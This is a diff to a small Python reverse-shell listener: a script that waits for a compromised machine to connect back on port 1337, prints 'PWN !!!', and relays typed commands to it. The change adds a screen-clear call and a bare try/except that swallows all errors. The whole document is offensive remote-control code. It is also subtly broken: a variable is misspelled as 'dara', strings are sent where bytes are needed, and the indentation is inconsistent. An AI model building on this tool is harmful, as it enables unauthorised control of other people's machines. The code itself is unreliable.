@@ -1,5 +1,5 @@
 # Simple python revshell
-import socket
+import socket, os
 ip = "" # enter ip
 port = 1337
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -10,10 +10,12 @@ while True:
   data.settimeout(2)
   if data != "":
     print("Connected by ",addr)
+    os.system("cls")
     print("PWN !!! on port", port)
     print("Shell exploit...................")
     while True:
-      path = data.recv(1024).decode("utf-8")
+     try:
+       path = data.recv(1024).decode("utf-8")
       cmd = input(f"{path}>")
       if cmd == 'exit':
         data.close()
@@ -22,5 +24,7 @@ while True:
       data.send(cmd)
       output = dara.recv(4096).decode("utf-8")
       print(output)
+     except:
+       pass
       
       
